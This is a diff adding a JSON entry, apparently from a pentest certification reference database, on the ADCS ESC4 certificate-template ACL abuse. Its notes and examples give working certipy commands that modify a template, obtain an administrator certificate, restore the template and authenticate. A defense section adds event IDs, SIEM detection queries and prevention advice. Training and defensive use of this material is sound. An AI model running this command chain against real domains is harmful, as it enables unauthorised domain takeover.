@@ -1,0 +1,101 @@
+{
+  "id": "ad-adcs-esc4-template-acl",
+  "name": "ADCS ESC4 - Certificate Template ACL Abuse",
+  "command": "certipy template -u <user>@<domain> -p <password> -template VulnTemplate -save-old",
+  "description": "ESC4 exploits overly permissive ACLs on certificate templates. If a low-privileged user has WriteProperty/WriteDacl/WriteOwner on a template, they can modify it to enable ESC1 conditions, request a certificate as any user, then restore the original template.",
+  "platform": "linux",
+  "type": "attack-chain",
+  "opsec": "quiet",
+  "category": "Active Directory",
+  "subcategory": "ADCS Attacks",
+  "certifications": [
+    "CRTP",
+    "CPTS"
+  ],
+  "primary_cert": "CRTP",
+  "source": "SpecterOps ADCS whitepaper; certipy",
+  "tags": [
+    "adcs",
+    "esc4",
+    "certificate-template",
+    "acl-abuse",
+    "certipy",
+    "pki"
+  ],
+  "mitre": [
+    "T1649"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== THE IDEA ===\nIf you can WRITE to a certificate template (WriteProperty, WriteDacl,\nor WriteOwner), you can modify it to be vulnerable to ESC1, request\na cert as admin, then restore the template.\n\n=== FIND VULNERABLE TEMPLATES ===\n  certipy find -u user@corp.local -p pass -dc-ip <dc_ip> -vulnerable\n  # Look for templates where your user/group has write permissions\n\n=== EXPLOIT ===\n  # Step 1: Save original template and modify to ESC1\n  certipy template -u user@corp.local -p pass -template VulnTemplate -save-old\n\n  # Step 2: Request certificate as administrator\n  certipy req -u user@corp.local -p pass -ca CORP-CA -template VulnTemplate -upn administrator@corp.local\n\n  # Step 3: Restore the template\n  certipy template -u user@corp.local -p pass -template VulnTemplate -configuration VulnTemplate.json\n\n  # Step 4: Authenticate with the certificate\n  certipy auth -pfx administrator.pfx -dc-ip <dc_ip>\n\n=== WHAT CERTIPY MODIFIES ===\n- Sets ENROLLEE_SUPPLIES_SUBJECT flag\n- Sets Client Authentication EKU\n- Enables enrollment for the attacker\n- Removes manager approval requirement",
+  "examples": [
+    {
+      "label": "Save and modify vulnerable template",
+      "command": "certipy template -u user@corp.local -p pass -template VulnTemplate -save-old"
+    },
+    {
+      "label": "Request cert as admin",
+      "command": "certipy req -u user@corp.local -p pass -ca CORP-CA -template VulnTemplate -upn administrator@corp.local"
+    },
+    {
+      "label": "Restore original template",
+      "command": "certipy template -u user@corp.local -p pass -template VulnTemplate -configuration VulnTemplate.json"
+    }
+  ],
+  "references": [
+    {
+      "title": "SpecterOps - Certified Pre-Owned",
+      "url": "https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf"
+    },
+    {
+      "title": "Certipy - ly4k",
+      "url": "https://github.com/ly4k/Certipy"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "ad-certipy-toolkit",
+      "note": "certipy find discovers vulnerable templates including ESC4.",
+      "rel": "prereq"
+    },
+    {
+      "id": "ad-esc15-ekuwu",
+      "note": "ESC15 is another template-based ADCS attack.",
+      "rel": "alternative"
+    }
+  ],
+  "defense": {
+    "why_it_works": "Certificate templates are AD objects with their own ACLs. If a low-privileged user has write access, they can reconfigure the template to allow arbitrary certificate enrollment.",
+    "prerequisites": "WriteProperty, WriteDacl, or WriteOwner on a certificate template; enrollment rights.",
+    "impact": "Full domain compromise via forged certificates.",
+    "detection": "[MITRE T1649] Certificate template modification events; rapid modify-request-restore pattern.",
+    "artifacts": "Event 4899 (template modified); Event 4886/4887 (cert request/issue); restored template.",
+    "splunk_spl": "index=wineventlog EventCode=4899\n| table _time, SubjectUserName, TemplateChange, TemplateName",
+    "elastic_kql": "event.code:\"4899\"",
+    "sentinel_kql": "SecurityEvent\n| where EventID == 4899\n| project TimeGenerated, SubjectUserName, Activity",
+    "sigma_rules": "win_adcs_template_modification",
+    "prevention": "Audit certificate template ACLs; remove unnecessary write permissions; monitor template changes.",
+    "sources": [
+      "https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf",
+      "https://attack.mitre.org/techniques/T1649/"
+    ],
+    "detections": [
+      {
+        "platform": "sentinel",
+        "name": "ESC4 - Certificate template ACL modification",
+        "logic": "SecurityEvent\n| where EventID == 4899 or (EventID == 5136 and ObjectClass == \"pKICertificateTemplate\")\n| project TimeGenerated, SubjectUserName, ObjectDN, OperationType",
+        "data_source": "windows-security",
+        "log_ids": [
+          "4899",
+          "5136"
+        ],
+        "attack": [
+          "T1649"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "high",
+        "false_positives": "Legitimate template management by PKI administrators",
+        "tuning": "Alert on modifications by non-PKI-admin accounts"
+      }
+    ]
+  }
+}
